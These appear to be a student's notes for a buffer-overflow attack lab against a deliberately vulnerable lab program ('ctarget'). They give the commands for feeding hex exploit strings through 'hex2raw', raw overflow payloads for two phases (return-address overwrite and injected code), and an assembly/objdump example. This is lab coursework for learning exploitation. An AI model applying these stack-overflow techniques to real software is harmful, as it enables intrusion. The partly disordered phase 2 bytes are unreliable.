
// command to run the program with customized hex code
cat exploit.txt | ./hex2raw | ./ctarget -q

// command to debug in gdb
run exploit.txt > ./hex2raw -q
// or
run < exploit_raw.txt


// disassemble the binary file to asm
objdump -d ctarget > ctarget.d

// convert txt hex to the format that the program can read
bash> ./hex2raw < exploit.txt >| exploit_raw.txt


// phase_1
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
c0 17 40 00 00 00 00 00
  

# Example of hand-generated assembly code
pushq $0xabcdef # Push value onto stack
addq $17,%rax # Add 17 to %rax
movl %eax,%edx # Copy lower 32 bits of %eax to %edx

// use command to compile and disassemble them to generate machine code
unix> gcc -c example.s
unix> objdump -d example.o > example.d


// phase_2

AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA c3 # ret
00 40 17 ec c4 c7 48 00 # set rsp
59 b9 97 fa c7 c7 48 00 # mov instruction
98 dc 61 55 00 00 00 00 # ret address

// will get file
example.o: file format elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
0: 68 ef cd ab 00 pushq $0xabcdef
5: 48 83 c0 11 add $0x11,%rax
9: 89 c2 mov %eax,%edx
